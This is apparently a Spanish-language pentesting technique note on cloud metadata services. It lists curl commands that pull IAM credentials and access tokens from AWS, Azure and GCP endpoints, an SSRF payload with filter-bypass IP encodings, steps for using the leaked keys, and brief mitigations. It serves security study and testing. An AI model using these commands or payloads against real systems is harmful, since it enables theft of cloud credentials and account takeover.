---
aliases:
tags:
  - asset/cloud
  - technique/credential-access
kind: Technique
linked:
  - "[[SSRF - Cloud Metadata]]"
  - "[[Cloud Credential Hunting]]"
---
# Cloud Metadata Services

> [!info]
> IPs/endpoints internos donde instancias cloud exponen metadata + credenciales temporales del IAM role. Acceso via local host O via SSRF desde web app que corre en VM. Vector clásico de privilege escalation cloud.

***

## Endpoints por provider

### AWS EC2 (IMDS)

Endpoint: `http://169.254.169.254/latest/`

**IMDSv1** (legacy, sin token):
```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# → JSON con AccessKeyId, SecretAccessKey, Token
```

**IMDSv2** (token-based, default desde 2021):
```bash
TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Otros paths útiles:
- `/latest/user-data` — startup script (puede contener creds)
- `/latest/dynamic/instance-identity/document` — region, account ID, etc.
- `/latest/meta-data/hostname`
- `/latest/meta-data/local-ipv4`, `/latest/meta-data/public-ipv4`

### Azure (IMDS)

Endpoint: `http://169.254.169.254/metadata/`

```bash
# Instance metadata (requiere header Metadata: true)
curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'

# Identity token (managed identity)
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
# → JWT access_token para Azure Management API
```

Resources comunes para token:
- `https://management.azure.com/` — ARM API
- `https://graph.microsoft.com/` — Graph API
- `https://vault.azure.net` — Key Vault
- `https://storage.azure.com/` — Storage

### GCP (Metadata)

Endpoint: `http://metadata.google.internal/` (también `169.254.169.254`)

```bash
# Header obligatorio
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# → access_token OAuth2 con scopes del SA attached
```

Otros paths:
- `/computeMetadata/v1/instance/attributes/` — custom attributes
- `/computeMetadata/v1/project/attributes/` — project metadata
- `/computeMetadata/v1/instance/service-accounts/default/email` — SA email
- `/computeMetadata/v1/instance/service-accounts/default/scopes`

### Otros

- **DigitalOcean**: `http://169.254.169.254/metadata/v1/`
- **Alibaba Cloud**: `http://100.100.100.200/`
- **Oracle Cloud**: `http://169.254.169.254/opc/v1/`
- **Kubernetes**: `https://kubernetes.default.svc.cluster.local/`

***

## Vector SSRF

Si la web app corre en una VM cloud y tiene SSRF, payload típico:

```
http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

Bypass de filtros comunes:
- `http://0.0.0.0/`
- `http://[::1]/` (IPv6 loopback)
- `http://2852039166/` (decimal IP)
- `http://0x0A0A0A0A/` (hex IP)
- DNS rebinding (recordrebind, makemehappy)

Ver [[SSRF - Cloud Metadata]].

***

## Uso post-leak

```bash
# Set creds en env vars
export AWS_ACCESS_KEY_ID=<from-metadata>
export AWS_SECRET_ACCESS_KEY=<from-metadata>
export AWS_SESSION_TOKEN=<from-metadata>

# Verify
aws sts get-caller-identity

# Enumerate permissions
enumerate-iam
```

Ver [[AWS Enumeration]], [[Azure Enumeration]], [[GCP Enumeration]].

***

## Mitigation

- **AWS**: IMDSv2 required (`HttpTokens=required`)
- **Azure**: Network filter en metadata endpoint
- **GCP**: VPC Service Controls, IAM least-privilege
- **App-level**: validate URLs antes de fetch (allowlist), bloquear 169.254.x.x

***

## Notas Relacionadas

- [[SSRF - Cloud Metadata]]
- [[Cloud Credential Hunting]]
- [[AWS Enumeration]]
- [[Azure Enumeration]]
- [[GCP Enumeration]]
